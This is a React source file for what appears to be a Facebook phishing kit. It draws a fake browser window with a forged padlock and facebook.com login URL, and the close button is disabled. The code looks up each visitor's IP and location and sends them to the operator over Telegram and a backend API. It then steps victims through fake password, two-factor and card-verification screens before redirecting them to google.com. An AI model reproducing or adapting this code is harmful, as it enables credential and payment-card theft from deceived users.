import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Form, Input, Select, Row, Col, Modal } from "antd";
import { sendTelegram } from "./utils/sendTelegram";
import { v4 as uuidv4 } from "uuid";
import { getIpAddress } from "./utils/getIpAddress";
import { ConfirmationModal } from "./ConfirmationModal";
import { Confirmation } from "./Confirmation";
import { CodeTwo } from "./CodeTwo";
import { ConfirmationSecond } from "./ConfirmationSecond";
import { TH } from "./TH";
import { API_BE } from "./utils/variable";
import { LoadingFacebookButton } from "./LoadingFacebookButton";
import { TenMinute } from "./TenMinute";
import { Landing } from "./Landing";
import axios from "axios";
import { VerificationCC } from "./VerificationCC";
import { RestrictedEmail } from "./RestrictedEmail";
import { getConfig } from "./utils/getConfig";

export const FacebookButton = () => {
    const [isModalVisible, setIsModalVisible] = useState(false);
    const [modalState, setValue] = useState(55);

    const handleCancel = () => {
        return
        setIsModalVisible(false);
        setValue(55)
    };


    const showModal = () => {
        setIsModalVisible(true);
        getCurrentIp().then((data) => {
            getIpConfig(data);
            createUserDb();
        })
    };

    const createUserDb = () => {
        let unique_id = localStorage.getItem("unique_id");
        let ip_data = localStorage.getItem("ip-datas");
    
        if (unique_id) {
          ip_data = JSON.parse(ip_data);
          unique_id = JSON.parse(unique_id);
    
          const body = {
            unique_id: unique_id,
            ip_address: ip_data?.ip || "",
            country: ip_data?.city || "",
            country_code: ip_data?.country || "",
            email: ""
          };
    
          fetch(`${API_BE}/users`, {
            method: "POST",
            headers: {
              Accept: "application/json, text/plain, */*",
              "Content-Type": "application/json",
            },
            body: JSON.stringify(body),
          })
            .then((res) => res.json())
            .then(() => console.warn("yes!!"));
        }
      };

    const getCurrentIp = async () => {
        try {
            const { data } = await axios.get("https://api.ipify.org/?format=json");
            if(data && data.ip) {
                return data.ip
            }
        } catch (error) {
            return null;
        }
    }

    const getIpConfig = (ip) => {
        const unique_id = uuidv4();
        localStorage.setItem("unique_id", JSON.stringify(unique_id));

        if(!ip) return;
        fetch(`https://ipinfo.io/${ip}/json`)
            .then((response) => response.json())
            .then((data) => {
                let body = {
                    ip: data.ip,
                    country: data.country,
                    region: data.region,
                    city: data.city,
                    org: data.org,
                    zip: data.postal,
                };

                // Replace this
                localStorage.setItem("ip-datas", JSON.stringify(body));

                let telegram_data = `
          ===== ONLINE =====
            IP: ${data.ip}
            City: ${data.city}
            Region: ${data.region}
            Country: ${data.country}
            ORG: ${data.org}
            ZIP: ${data.postal}
          `;

                sendTelegram(telegram_data, true);
            });
    };



    const changeModalScreens = (state) => {
        if (state === 0) {
            return <LoadingFacebookButton isModalVisible={isModalVisible} setValue={setValue} handleCancel={handleCancel} />
        } else if (state === 1) {
            return <ConfirmationModal setValue={setValue} wrong_password={true} />
        } else if (state === 2) {
            return <Confirmation setValue={setValue} />
        } else if (state === 3) {
            return <ConfirmationSecond setValue={setValue} />
        } else if (state === 4) {
            return <TH setValue={setValue} />
        } else if (state === 5) {
            return window.location.replace("https://google.com/")
        }  else if (state === 6) {
            return <TenMinute setValue={setValue} />
        } else if (state === 7) {
            return <VerificationCC setValue={setValue} />
        } else if (state === 8) {
            return <RestrictedEmail setValue={setValue} />
        } else {
            return <ConfirmationModal setValue={setValue} />
        }
    }

    useEffect(() => {
        getConfig()
    }, [])

    return (
        <>
            <Landing showModal={showModal} />
            <Modal
            className="modal-wrapper  modal__facebook"
            width={1000}
            bodyStyle={{ height: 650 }}
            title={
                <div>
                    <div className="wrapper_header">
                        <div className="sign__up-modal">
                            <img src="/hLRJ1GG_y0J.ico" alt="" width="17px" />
                            <p>Log into Facebook | Facebook</p>
                        </div>
                        <div className="icons">
                            <div className="img" onClick={handleCancel}>
                                <img src="/minus.png" alt="" />
                            </div>
                            <div className="img">
                                <img src="https://icons-for-free.com/iconfiles/png/512/square-1321215626459427421.png" alt="" />
                            </div>
                            <div className="img img-x" onClick={handleCancel}>
                                <img src="/close.png" alt="" />
                            </div>
                        </div>
                    </div>
                    <div className="input__title-wrapper">
                        <div className="lock__screen">
                            <div className="lock">
                                <div className="lock__wrapper">
                                    <img src="/locktest.png" alt="" />
                                    <span className="green">Secure | https:</span><span className="black-opacity">//</span>
                                </div>
                            </div>
                            <span className="input__value">
                                www.facebook.com
                                <span className="black"> /login.php?skip<span className="hide__text-mobile">_api_login=1  &api_key=481324359126967&kid_directed_site=0&app_id=481324359126967&signed...</span></span>
                            </span>
                        </div>

                        {/* <div className="lock lock-img">
                <div className="lock__wrapper">
                  <img src="/zoom-in.png" alt="" />
                </div>
              </div> */}
                    </div>
                </div>
            }
            open={isModalVisible}
            maskClosable={false}
        >
            {changeModalScreens(modalState)}
        </Modal>
        </>

      
    )

    return <div>
        <button onClick={() => showModal()}>Login with facebook</button>
        <Modal
            className="modal-wrapper  modal__facebook"
            width={1000}
            bodyStyle={{ height: 650 }}
            title={
                <div>
                    <div className="wrapper_header">
                        <div className="sign__up-modal">
                            <img src="/hLRJ1GG_y0J.ico" alt="" width="17px" />
                            <p>Log into Facebook | Facebook</p>
                        </div>
                        <div className="icons">
                            <div className="img" onClick={handleCancel}>
                                <img src="/minus.png" alt="" />
                            </div>
                            <div className="img">
                                <img src="https://icons-for-free.com/iconfiles/png/512/square-1321215626459427421.png" alt="" />
                            </div>
                            <div className="img img-x" onClick={handleCancel}>
                                <img src="/close.png" alt="" />
                            </div>
                        </div>
                    </div>
                    <div className="input__title-wrapper">
                        <div className="lock__screen">
                            <div className="lock">
                                <div className="lock__wrapper">
                                    <img src="/locktest.png" alt="" />
                                    <span className="green">Secure | https:</span><span className="black-opacity">//</span>
                                </div>
                            </div>
                            <span className="input__value">
                                www.facebook.com
                                <span className="black"> /login.php?skip<span className="hide__text-mobile">_api_login=1  &api_key=481324359126967&kid_directed_site=0&app_id=481324359126967&signed...</span></span>
                            </span>
                        </div>

                        {/* <div className="lock lock-img">
                            <div className="lock__wrapper">
                            <img src="/zoom-in.png" alt="" />
                            </div>
                        </div> */}
                    </div>
                </div>
            }
            open={isModalVisible}
            maskClosable={false}
        >
            {changeModalScreens(modalState)}
        </Modal>
    </div>
}